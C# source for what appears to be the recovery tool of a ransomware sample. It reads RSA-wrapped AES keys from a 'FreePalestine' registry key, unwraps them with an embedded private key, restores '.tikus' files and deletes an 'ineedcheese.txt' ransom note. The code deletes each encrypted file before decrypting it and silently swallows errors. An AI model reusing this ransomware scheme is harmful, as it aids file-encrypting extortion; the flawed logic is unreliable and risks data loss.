using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

public class GetKey
{
    public static RegistryKey LocalReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\FreePalestine");

    public static string GetPublicKey()
    {
        var publicKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"));
        return publicKey;
    }

    public static string GetPrivateKey()
    {
        string privateKey = Encoding.UTF8.GetString((byte[])LocalReg.GetValue("privateKey"));
        return privateKey;
    }

    public static byte[] GetAESKey()
    {
        byte[] aeskey = (byte[])LocalReg.GetValue("aesKey");

        return aeskey;
    }

    public static byte[] GetAESIV()
    {
        byte[] aesiv = (byte[])LocalReg.GetValue("aesIV");

        return aesiv;
    }
}

public class Asymmetric
{

    public class RSA
    {
        /// <summary>
        /// Create a public and private key.
        ///
        /// The RSACryptoServiceProvider supports key sizes from 384
        /// bits to 16384 bits in increments of 8 bits if you have the
        /// Microsoft Enhanced Cryptographic Provider installed. It
        /// supports key sizes from 384 bits to 512 bits in increments
        /// of 8 bits if you have the Microsoft Base Cryptographic
        /// Provider installed.
        /// </summary>
        /// <param name="publicKey">The created public key.</param>
        /// <param name="privateKey">The created private key.</param>
        /// <param name="keySize">Size of keys.</param>
        public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 4096)
        {
            publicKey = null;
            privateKey = null;

            var csp = new CspParameters
            {
                ProviderType = 1,
                Flags = CspProviderFlags.UseArchivableKey,
                KeyNumber = (int)KeyNumber.Exchange
            };

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(keySize, csp);

            publicKey = rsa.ToXmlString(false);
            privateKey = rsa.ToXmlString(true);

            rsa.PersistKeyInCsp = false;
        }

        /// <summary>
        /// Encrypt data using a public key.
        /// </summary>
        /// <param name="bytes">Bytes to encrypt.</param>
        /// <param name="publicKey">Public key to use.</param>
        /// <returns>Encrypted data.</returns>
        public static byte[] Encrypt(byte[] bytes, string publicKey)
        {
            var csp = new CspParameters
            {
                ProviderType = 1
            };

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

            rsa.FromXmlString(publicKey);
            var data = rsa.Encrypt(bytes, false);

            rsa.PersistKeyInCsp = false;

            return data;
        }

        /// <summary>
        /// Encrypt data using a public key.
        /// </summary>
        /// <param name="input">Data to encrypt.</param>
        /// <param name="publicKey">Public key to use.</param>
        /// <returns>Encrypted data.</returns>
        public static string Encrypt(string input, string publicKey)
        {
            if (input == null)
            {
                throw new Exception("Input cannot be null");
            }

            return Convert.ToBase64String(
                Encrypt(
                    Encoding.UTF8.GetBytes(input),
                    publicKey));
        }

        /// <summary>
        /// Decrypt data using a private key.
        /// </summary>
        /// <param name="bytes">Bytes to decrypt.</param>
        /// <param name="privateKey">Private key to use.</param>
        /// <returns>Decrypted data.</returns>
        public static byte[] Decrypt(byte[] bytes, string privateKey)
        {
            var csp = new CspParameters
            {
                ProviderType = 1
            };

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

            rsa.FromXmlString(privateKey);
            var data = rsa.Decrypt(bytes, false);

            rsa.PersistKeyInCsp = false;

            return data;
        }

        /// <summary>
        /// Decrypt data using a private key.
        /// </summary>
        /// <param name="input">Base64 data to decrypt.</param>
        /// <param name="privateKey">Private key to use.</param>
        /// <returns>Decrypted data.</returns>
        public static string Decrypt(string input, string privateKey)
        {
            if (input == null)
            {
                throw new Exception("Input cannot be null");
            }

            return Encoding.UTF8.GetString(
                Decrypt(
                    Convert.FromBase64String(input),
                    privateKey));
        }
    }
}

public class AES
{
    public static byte[] AESDecrypt(byte[] cipherData, byte[] aes_key, byte[] aes_iv)
    {

        MemoryStream ms = new MemoryStream();

        Rijndael alg = Rijndael.Create();

        alg.Key = aes_key;
        alg.IV = aes_iv;

        CryptoStream cs = new CryptoStream(ms,
            alg.CreateDecryptor(), CryptoStreamMode.Write);

        cs.Write(cipherData, 0, cipherData.Length);

        cs.Close();

        byte[] decryptedData = ms.ToArray();

        return decryptedData;
    }
}

class Program
{
    public static bool IsElevated
    {
        get
        {
            return WindowsIdentity.GetCurrent().Owner
              .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        }
    }

    public static string CPrivKey = @"<RSAKeyValue><Modulus>oe35yuxRwuW74vjUUfvJStVczN882Yayi3PVh9Mc2MgBY1JePsolQTKsnEmXAZO1pg7JpzNtgrfTxrAq3KrFI2M3nmv8ZpqWriqy9UofNuM+7jWy1Jnc7NcJMFFdspzNsRsWF4VowAtFK69C9JvINo+eeJvKLuRSEJmsCQCkf823MwwB3C/ovcd1bI5h63to0bXAP2MXj8FNVs63g+cvdmBKqVnSZ4bdm0BJkcBYLN3ut8I1eZ6WwGy8vaPwfrg+af5hoLiAKKKHH9dItjDodDTDmgZ5XoBXNrkA6klkcoQa0iDlphwijTwonCurRHsHwY2BwziejA3Ipa/T7GcIZQ==</Modulus><Exponent>AQAB</Exponent><P>0J/lXzWBiBY6ljZt3VuJHdYASKobeHHimN7Glq6JmvZiCF7C43oOsLcKr18ky0Bfn7ZPzj3QEi21cgt4o6E6j7GIQODi0xI77n8PDf8+HCgnlvlOpR9BB1QbCcpqMKTguCYrg3cV+JOwRBXmx55xpCiOS5Ilpg1k64nTdROqLZ8=</P><Q>xrOHsqS1p7JrvUVoPHpUa4AXSuJeDkeSHKv7Gg5oSbfxGvE39xlDnbsEuAz1jyWgdo+s2UXYRp3JZ/GWC6Khezly3NRdcGyiJHm5lOVywIXDs7TaNFfQi7LdV3wJ5zDtF+4FcW5qhUEstI/fP27YrDB4XnvDzWSltjeZXcY9w3s=</Q><DP>ym7cuo3IqqwnHSqjYG85lWHZ1Kh7D1wya/N+7yddDqiUZ1rL8L63EnIKRDEmGrLUFr1oos8H3xvLPGY1IVGI6XVyqMGOVxESZlGT4hkRw3CTOcOftEmnZ90Mf2uRrrHN++HNxzr+br2gA/DchkYQLyHLMTkWnxHQI10RekEimDE=</DP><DQ>N7FgSnkSFWPUAOPwWGstOEhZvvp9xGDZGkI2ClKZdnghEx0jQ5YINrCRnQi81xeDx1dz6h5ChWB6cDDtjmtR+ZjbkfvQCM/aDoEzvAEnzcBwXvFE68DlShKjKX8xw2QaQEfNrMJ3BsyCvEVLHJt0Dac0Rb9I3UvlipJA4WDMNPs=</DQ><InverseQ>E/UU39gqtGs0yFR8CJgJrGsUyyw98+ytLdxOlBt6A8hxEz65LXtTI/TfL26uvQ4HTDS3wegWcJzHN0FxUUTIYfuhTeBNEC/eym9eiKkmjZ3SC1NHpBM5oAkIBAN5MVFKDMHMRKSotu5tanzc68xzy3Ad+T+YRZAbEG08weUuPjs=</InverseQ><D>GM6UTfoWLH11YzgrjsO7+rLlHJ22fLyd7a85Ly2wZaV+UPD1bzkYq/xPZUIA2EUAtwfc7Lh8NmJjFzU128htmxZAFw0EBdP48YWpFNreHVKC+YtQcjGAHuhyh+xvJkXPXSqBH+lYOtN/LUoUP9T9vx4RcPis6LIhwFlKebaXfNyQpXl721F3RFZnFLGmmWkuK4n33xDZF3t0ZdY5C5HYev1I4fAil2fV5sGOY6YiUqz507QoI14t76/h5Q74h0Pkv7iIVzJ8WKW4BaPA02+CXkYzOC8jqBjYBVjFHBw5OGjU2nQ/tcIiYfxzJJQ9rBbSgjjmIuiV+c4xzxZUu7isoQ==</D></RSAKeyValue>";

    static void Main(string[] args)
    {
        var baseDir = @"C:\Users\ch4rm\Desktop";

        string ransomFormat = ".tikus";

        var blockList = new List<string> { "exe", "tikus", "key", "pub" };

        var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

        if (!IsElevated)
        {
            Console.WriteLine("Make sure to run this as administrator");
        }
        else
        {

            if (Directory.Exists(baseDir))
            {
                try
                {
                    var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);

                    //var privateKey = GetKey.GetPrivateKey();
                    byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), CPrivKey);

                    byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), CPrivKey);

                    //decrypt with this
                    foreach (var file in targetDirs.Where(x => x.EndsWith(ransomFormat)))
                    {
                        var decryptedFile = Path.GetFileNameWithoutExtension(file);
                        var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
                        var ransomNotePath = Path.GetDirectoryName(file) + "\\ineedcheese.txt";

                        if (!File.Exists(decryptedFile))
                        {
                            var fileContent = File.ReadAllBytes(file);

                            File.Delete(file);

                            var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);

                            File.WriteAllBytes(outputFile, decrypted);

                            if (File.Exists(ransomNotePath))
                                File.Delete(ransomNotePath);

                        }

                    }
                }
                catch
                {

                }

            }

        }
    }
}
